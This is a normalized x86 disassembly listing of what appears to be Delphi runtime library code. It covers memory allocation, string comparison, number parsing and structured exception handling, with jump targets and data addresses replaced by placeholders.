mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403918
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_405c20
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405c20
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405c20
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405c20
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402948
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_40299c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_4029f4
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402a10
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402a94
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b04
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b24
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c04
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c44
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402cf7 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402cf7 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402cf7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f30
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f60
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_402fd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_40305c
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403104
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_40315c
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4048e4
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_40317c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405508
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403230
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403240
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403237
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_40317c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405508
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403240
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403284
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_40330c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032c4
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4032f4
push eax
push ecx
mov eax [ eax ]
call sub_4032c4
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e24
call [ rw-data ]
sub_40333c
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032c4
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403364
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033b4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403404
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_40342d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403498
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4034d4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4034e8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4034fc
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_40351c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4034fc
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403580
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403024
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405c20
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4034e8
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403498
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4036ac
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403024
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403498
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405c20
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4034d4
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402a94
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403834
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_40351c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_40386c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e24
sub_403894
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405c20
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4030f8
call sub_40347c
sub_4038e8
call sub_405c20
